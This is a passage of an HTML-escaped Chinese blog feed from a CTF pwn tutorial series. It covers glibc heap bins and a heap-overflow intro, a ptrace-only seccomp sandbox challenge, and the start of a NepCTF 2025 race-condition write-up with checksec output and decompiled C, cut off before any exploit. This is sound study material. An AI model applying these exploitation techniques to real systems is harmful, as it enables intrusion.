&lt;li>只支持单向链表（每个 chunk 的 fd 指向下一个 chunk）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="tcache">tcache
&lt;a class="header-anchor" href="#tcache">&lt;/a>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>结构&lt;/strong>：单向链表&lt;/li>
&lt;li>&lt;strong>来源&lt;/strong>：free 时直接进入 tcache（优先于 fastbin）&lt;/li>
&lt;li>&lt;strong>用途&lt;/strong>：线程本地缓存，加速小块内存分配和释放&lt;/li>
&lt;li>&lt;strong>chunk size 范围&lt;/strong>：
&lt;ul>
&lt;li>仅支持小于等于 &lt;code>0x410&lt;/code>（1040字节）的 chunk（包含头部，实际范围依 glibc 版本不同）&lt;/li>
&lt;li>size 字段为 chunk_size + 标志位&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>特点&lt;/strong>：
&lt;ul>
&lt;li>每个 size 类别最多存储 7 个 chunk（超出则进入 unsorted bin）&lt;/li>
&lt;li>不合并相邻空闲块&lt;/li>
&lt;li>只支持单向链表（每个 chunk 的 fd 指向下一个 chunk）&lt;/li>
&lt;li>属于线程本地数据结构，各线程 tcache 独立，提升多线程性能&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="unsorted-bin">unsorted bin
&lt;a class="header-anchor" href="#unsorted-bin">&lt;/a>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>结构&lt;/strong>：双向链表（fd/bk）&lt;/li>
&lt;li>&lt;strong>来源&lt;/strong>：
&lt;ul>
&lt;li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。&lt;/li>
&lt;li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。&lt;/li>
&lt;li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>用途&lt;/strong>：存放刚释放的非 fastbin chunk（大于 fastbin 范围）&lt;/li>
&lt;li>&lt;strong>特点&lt;/strong>：
&lt;ul>
&lt;li>不按大小排序，先进后出（FIFO）&lt;/li>
&lt;li>后续 malloc 时会根据大小转移到 smallbin 或 largebin&lt;/li>
&lt;li>所有非 fastbin 的 chunk 释放时都先进入 unsorted bin&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="unsorted-bin-转化">unsorted bin 转化
&lt;a class="header-anchor" href="#unsorted-bin-%e8%bd%ac%e5%8c%96">&lt;/a>
&lt;/h4>&lt;ul>
&lt;li>
&lt;p>&lt;strong>malloc 请求触发归类&lt;/strong>&lt;br>
当你 malloc 时，会优先在 unsorted bin 中查找是否有足够大的 chunk。&lt;br>
如果 unsorted bin 中有 chunk 不足以分配请求的大小，这些 chunk 会被按大小归类，分别转移到 smallbin 或 largebin。&lt;br>
chunk size ≤ smallbin 最大值，进入 smallbin&lt;br>
chunk size &amp;gt; smallbin 最大值，进入 largebin&lt;br>
这个过程中，所有遍历到但不满足分配条件的 chunk 都会被“搬家”到对应的 bin。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 堆溢出初探</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%9D%E6%8E%A2/</link><pubDate>Mon, 28 Jul 2025 10:48:03 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%9D%E6%8E%A2/</guid><description>&lt;h2 id="堆介绍">堆介绍
&lt;a class="header-anchor" href="#%e5%a0%86%e4%bb%8b%e7%bb%8d">&lt;/a>
&lt;/h2>&lt;p>堆是动态分配内存的区域，通常用于存储在运行时需要动态分配的对象。堆内存的分配和释放由程序员控制，常见的操作包括 &lt;code>malloc&lt;/code>、&lt;code>free&lt;/code> 等。&lt;/p>
&lt;p>&lt;img src="/imgs/img-lazy-loading.gif" data-src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/program_virtual_address_memory_space.png" alt="操作系统内存布局示意图" />&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ptrace 沙箱</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ptrace-%E6%B2%99%E7%AE%B1/</link><pubDate>Sun, 27 Jul 2025 21:27:26 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ptrace-%E6%B2%99%E7%AE%B1/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>这类题目一般只会允许调用 Ptrace 系统调用&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1">1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2">2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3">3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4">4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5">5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6">6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7">7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8">8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9">9&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~/P/n/smallbox ❯❯❯ seccomp-tools dump ./smallbox &lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> please input your shellcode:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> line CODE JT JF &lt;span class="nv">K&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0000: 0x20 0x00 0x00 0x00000000 &lt;span class="nv">A&lt;/span> &lt;span class="o">=&lt;/span> sys_number
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0001: 0x15 0x00 0x01 0x00000065 &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>A !&lt;span class="o">=&lt;/span> ptrace&lt;span class="o">)&lt;/span> goto &lt;span class="m">0003&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0002: 0x06 0x00 0x00 0x7fff0000 &lt;span class="k">return&lt;/span> ALLOW
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0003: 0x06 0x00 0x00 0x00000000 &lt;span class="k">return&lt;/span> KILL&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;h3 id="ptrace-系统调用">ptrace 系统调用
&lt;a class="header-anchor" href="#ptrace-%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8">&lt;/a>
&lt;/h3>&lt;p>ptrace 是 Linux 中的一个系统调用，可以让父进程控制子进程运行，并可以检查和改变子进程的内存和寄存器状态。它通常用于调试器和沙箱环境中。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 条件竞争</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</link><pubDate>Sun, 27 Jul 2025 20:13:08 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>条件竞争通常发生在多个线程或进程同时访问共享资源时，导致程序行为不可预测。&lt;/p>
&lt;h2 id="例题">例题
&lt;a class="header-anchor" href="#%e4%be%8b%e9%a2%98">&lt;/a>
&lt;/h2>&lt;h3 id="nepctf-2025---time">NepCtf 2025 - time
&lt;a class="header-anchor" href="#nepctf-2025---time">&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1">1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2">2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3">3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4">4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5">5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6">6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7">7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8">8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9">9&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~/P/n/time ❯❯❯ pwn checksec ./time &lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="s1">&amp;#39;/home/lhon901/Pwn/nepctf2025/time/time&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RELRO: Full RELRO
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Stack: Canary found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NX: NX enabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PIE: PIE enabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SHSTK: Enabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IBT: Enabled&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>


&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-1-1">&lt;a class="lnlinks" href="#hl-1-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-2">&lt;a class="lnlinks" href="#hl-1-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-3">&lt;a class="lnlinks" href="#hl-1-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-4">&lt;a class="lnlinks" href="#hl-1-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-5">&lt;a class="lnlinks" href="#hl-1-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-6">&lt;a class="lnlinks" href="#hl-1-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-7">&lt;a class="lnlinks" href="#hl-1-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-8">&lt;a class="lnlinks" href="#hl-1-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-9">&lt;a class="lnlinks" href="#hl-1-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-10">&lt;a class="lnlinks" href="#hl-1-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-11">&lt;a class="lnlinks" href="#hl-1-11">11&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-12">&lt;a class="lnlinks" href="#hl-1-12">12&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-13">&lt;a class="lnlinks" href="#hl-1-13">13&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-14">&lt;a class="lnlinks" href="#hl-1-14">14&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-15">&lt;a class="lnlinks" href="#hl-1-15">15&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-16">&lt;a class="lnlinks" href="#hl-1-16">16&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-17">&lt;a class="lnlinks" href="#hl-1-17">17&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-18">&lt;a class="lnlinks" href="#hl-1-18">18&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-19">&lt;a class="lnlinks" href="#hl-1-19">19&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-20">&lt;a class="lnlinks" href="#hl-1-20">20&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-21">&lt;a class="lnlinks" href="#hl-1-21">21&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-22">&lt;a class="lnlinks" href="#hl-1-22">22&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-23">&lt;a class="lnlinks" href="#hl-1-23">23&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-24">&lt;a class="lnlinks" href="#hl-1-24">24&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-25">&lt;a class="lnlinks" href="#hl-1-25">25&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-26">&lt;a class="lnlinks" href="#hl-1-26">26&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-27">&lt;a class="lnlinks" href="#hl-1-27">27&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-28">&lt;a class="lnlinks" href="#hl-1-28">28&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-29">&lt;a class="lnlinks" href="#hl-1-29">29&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-30">&lt;a class="lnlinks" href="#hl-1-30">30&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-31">&lt;a class="lnlinks" href="#hl-1-31">31&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-32">&lt;a class="lnlinks" href="#hl-1-32">32&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-33">&lt;a class="lnlinks" href="#hl-1-33">33&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-34">&lt;a class="lnlinks" href="#hl-1-34">34&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-35">&lt;a class="lnlinks" href="#hl-1-35">35&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-36">&lt;a class="lnlinks" href="#hl-1-36">36&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-37">&lt;a class="lnlinks" href="#hl-1-37">37&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-38">&lt;a class="lnlinks" href="#hl-1-38">38&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-39">&lt;a class="lnlinks" href="#hl-1-39">39&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-40">&lt;a class="lnlinks" href="#hl-1-40">40&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-41">&lt;a class="lnlinks" href="#hl-1-41">41&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-42">&lt;a class="lnlinks" href="#hl-1-42">42&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-43">&lt;a class="lnlinks" href="#hl-1-43">43&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-44">&lt;a class="lnlinks" href="#hl-1-44">44&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-45">&lt;a class="lnlinks" href="#hl-1-45">45&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-46">&lt;a class="lnlinks" href="#hl-1-46">46&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-47">&lt;a class="lnlinks" href="#hl-1-47">47&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-48">&lt;a class="lnlinks" href="#hl-1-48">48&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-49">&lt;a class="lnlinks" href="#hl-1-49">49&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-50">&lt;a class="lnlinks" href="#hl-1-50">50&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-51">&lt;a class="lnlinks" href="#hl-1-51">51&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-52">&lt;a class="lnlinks" href="#hl-1-52">52&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-53">&lt;a class="lnlinks" href="#hl-1-53">53&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-54">&lt;a class="lnlinks" href="#hl-1-54">54&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-55">&lt;a class="lnlinks" href="#hl-1-55">55&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-56">&lt;a class="lnlinks" href="#hl-1-56">56&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-57">&lt;a class="lnlinks" href="#hl-1-57">57&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-58">&lt;a class="lnlinks" href="#hl-1-58">58&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-59">&lt;a class="lnlinks" href="#hl-1-59">59&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-60">&lt;a class="lnlinks" href="#hl-1-60">60&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-61">&lt;a class="lnlinks" href="#hl-1-61">61&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-62">&lt;a class="lnlinks" href="#hl-1-62">62&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-63">&lt;a class="lnlinks" href="#hl-1-63">63&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-64">&lt;a class="lnlinks" href="#hl-1-64">64&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-65">&lt;a class="lnlinks" href="#hl-1-65">65&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-66">&lt;a class="lnlinks" href="#hl-1-66">66&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-67">&lt;a class="lnlinks" href="#hl-1-67">67&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-68">&lt;a class="lnlinks" href="#hl-1-68">68&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-69">&lt;a class="lnlinks" href="#hl-1-69">69&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-70">&lt;a class="lnlinks" href="#hl-1-70">70&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-71">&lt;a class="lnlinks" href="#hl-1-71">71&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-72">&lt;a class="lnlinks" href="#hl-1-72">72&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-73">&lt;a class="lnlinks" href="#hl-1-73">73&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-74">&lt;a class="lnlinks" href="#hl-1-74">74&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-75">&lt;a class="lnlinks" href="#hl-1-75">75&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-76">&lt;a class="lnlinks" href="#hl-1-76">76&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-77">&lt;a class="lnlinks" href="#hl-1-77">77&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-78">&lt;a class="lnlinks" href="#hl-1-78">78&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-79">&lt;a class="lnlinks" href="#hl-1-79">79&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-80">&lt;a class="lnlinks" href="#hl-1-80">80&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-81">&lt;a class="lnlinks" href="#hl-1-81">81&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-82">&lt;a class="lnlinks" href="#hl-1-82">82&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-83">&lt;a class="lnlinks" href="#hl-1-83">83&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-84">&lt;a class="lnlinks" href="#hl-1-84">84&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-85">&lt;a class="lnlinks" href="#hl-1-85">85&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-86">&lt;a class="lnlinks" href="#hl-1-86">86&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-87">&lt;a class="lnlinks" href="#hl-1-87">87&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="kr">__fastcall&lt;/span> &lt;span class="n">__noreturn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">a2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">a3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">pthread_t&lt;/span> &lt;span class="n">newthread&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-10h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">newthread&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_2A31&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">sub_2B0F&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">pthread_create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">newthread&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">start_routine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="nf">sub_2A31&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+10h] [rbp-30h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+38h] [rbp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;please input your name:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">__isoc99_scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%100s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">byte_50A0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;I will tell you all file names in the current directory!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;/bin/ls&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
